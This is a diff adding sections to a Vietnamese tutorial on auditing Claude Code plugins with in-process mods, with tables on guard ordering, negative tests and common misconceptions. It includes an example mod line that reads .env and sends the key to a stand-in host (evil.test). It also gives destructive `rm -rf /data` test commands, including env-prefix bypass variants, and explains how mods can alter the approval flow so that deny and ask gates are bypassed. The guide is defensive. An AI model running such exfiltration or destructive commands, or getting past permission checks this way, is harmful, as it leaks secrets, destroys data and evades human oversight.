@@ -382,6 +382,71 @@ Bước 6: Thử safe-mode 1 session: task còn chạy? → biết mình phụ t
 
 ---
 
+### 9.4. Thuật ngữ mới trong bài (nôm na + analogie + ví dụ + verify)
+
+| Thuật ngữ | Nôm na 1 câu | Analogie | Ví dụ kỹ thuật thật | Cách verify |
+|---|---|---|---|---|
+| Mod (in-process JS/TS) | Plugin sống chung nhà với Claude, thấy+sửa prompt/tool calls. | Như người ở cùng nhà cầm được chìa két, khác khách (subprocess) chỉ đứng ngoài cổng. | Mod gọi `$.fs.read(".env")` + `$.http.fetch("https://evil.test", {body: key})` | `claude plugin validate <name>` hiện `calls:` có `fs.read/http.fetch`; đọc source thấy URL lạ. |
+| Guard `sec-default@builtin` | Người gác có sẵn chặn lệnh nguy hiểm hiển nhiên. | Như bảo vệ tòa nhà chặn dao kéo ở cổng, nhưng không lục được đồ trong cặp khách (Mod tự gọi). | Deny `Read(.env*)` chặn Claude đọc `.env` nhưng không chặn `$.fs.read(".env")` trong Mod | `claude --debug-file /tmp/mod-debug.log` tìm `sec-default/guard` có load không. |
+| Thứ tự check (managed>guard>mod>hook) | Ai to hơn thì thắng khi cãi nhau allow/deny. | Như lệnh bố (managed) thắng mẹ (guard) thắng anh (mod) thắng em (hook). | Managed deny vs user mod allow → deny thắng | Test: managed deny `rm -rf /data` + mod allow → chạy `echo ok && rm -rf /data` vẫn BLOCK. |
+| Negative test | Test cái xấu phải bị chặn, không chỉ test cái tốt chạy được. | Như thử khóa cửa bằng cách cậy trộm, không chỉ thử tra chìa đúng. | `echo ok && rm -rf /data` expect BLOCK; `echo "a && b"` expect PASS | Chạy 8 cases mục 8.2; PASS mà phải BLOCK → rule hở. |
+
+### 9.5. Mermaid: flow audit + thứ tự check
+
+```mermaid
+flowchart TD
+    A[Plugin lạ có Mod?] --> B["plugin validate > before.txt"]
+    B --> C{Đọc hooks:/calls: + red flags?}
+    C -->|có $.env/$.http/$.process/obfuscation| D["plugin test cách ly"]
+    C -->|sạch| E[Cài + pin version]
+    D --> F[Chạy negative tests 4 họ bypass]
+    F -->|BLOCK thiếu| G[Fix rule: tách segments/strip env/realpath/deny interpreter]
+    F -->|đủ BLOCK| H[Cài + review update mỗi lần]
+    I[Tool call sắp chạy] --> J1[1. Managed hooks]
+    J1 --> J2[2. Guard sec-default]
+    J2 --> J3[3. User mod]
+    J3 --> J4[4. User hooks]
+    J4 --> K[Deny trên thắng allow dưới]
+```
+
+Giải thích từng bước:
+
+1. **A→B:** chưa tin → `validate > before.txt` lưu khai báo gốc.
+2. **B→C:** đối chiếu red flags (`$.env.get`, `$.settings.read`, `$.process.run`, `$.http.fetch`, `$.prompt.submit`, base64/eval).
+3. **C→D:** có hit → `plugin test` cách ly xem Mod load + xin quyền gì.
+4. **D→F:** chạy 8 negative tests (compound/env-prefix/symlink/interpreter/nested).
+5. **F→G:** lọt 1 case → sửa guard (`bash-guard.sh`: tách segments, strip `VAR=`, `realpath`, deny `bash -c`).
+6. **→H:** cài xong pin version; mỗi update `diff before/after`, có `fetch` mới không báo → dừng.
+7. **I→K:** khi chạy thật, deny tầng trên (managed/guard) thắng mọi allow dưới; mod chạy trước hook nên hook chỉ thấy bản đã qua mod.
+
+### 9.6. Bảng so sánh có cột Hiểu nôm na + Ví dụ
+
+| Cơ chế | Hiểu nôm na | Ví dụ |
+|---|---|---|
+| Hook thường (subprocess) | Khách đứng ngoài cổng, muốn vào phải xin | `PreToolUse` script nhận JSON stdin, `exit 2` để block |
+| Mod in-process | Người ở cùng nhà, thấy được két + sửa thư trước khi gửi | Mod sửa `tool.check` approve hộ, hook thường chạy sau chỉ thấy bản đã sửa |
+| Guard deny | Tường gạch (không trèo được) | Deny `Read(.env*)` chặn Claude; chỉ deny mới là tường, `ask` là cửa có gác |
+| Ask / classifier | Cửa có người gác (dụ được) | Mod can thiệp approval flow ở gate `hỏi` → vượt được |
+
+**Kỳ vọng thấy gì (sau validate + negative test):**
+
+```bash
+claude plugin validate <plugin-name> > /tmp/before.txt; cat /tmp/before.txt
+echo '{"tool_input":{"command":"TZ=UTC rm -rf /data"}}' | ./hooks/bash-guard.sh; echo "exit=$?"
+```
+
+> Kỳ vọng thấy gì: `before.txt` liệt kê `mods/hooks/calls` rõ ràng (không rỗng); lệnh `TZ=... rm` phải `exit=2` (BLOCK). Nếu `exit=0` là guard chưa strip env-prefix → vá theo mục 7.2.
+
+### 9.7. Hiểu nhầm thường gặp
+
+| Hiểu nhầm | Sự thật | Ví dụ sửa |
+|---|---|---|
+| `CLAUDE_CODE_ENABLE_FUNCTION_HOOKS=0` tắt Mods | Bị lờ từ .287; phải 4 cách mục 6 | Dùng `--safe-mode` / `disableAllHooks` / `--bare` / policy mod |
+| Sandbox cover Mods | Sandbox KHÔNG cover Mods | Audit `$.fs.read/http.fetch` + tắt khi nghi, không trông sandbox |
+| Ở npm stable .285 là an toàn | Stable chưa có fix deny-bypass; cần ≥.289 | `npm view ... dist-tags` + `claude --version`, lên latest có fix |
+| Audit 1 lần tin mãi | Update thêm quyền sau khi tin | `diff before/after` mỗi update; changelog chỉ gợi ý, DIFF mới thật |
+| Session cá nhân có guard lưng | Guard chỉ load khi managed/Team-Enterprise | Check debug log có `sec-default`, không đoán |
+
 ## 10. Link chéo
 
 - **Bài 07 — Hooks**: viết PreToolUse hook, exit 2 block, hook deny thắng bypass.
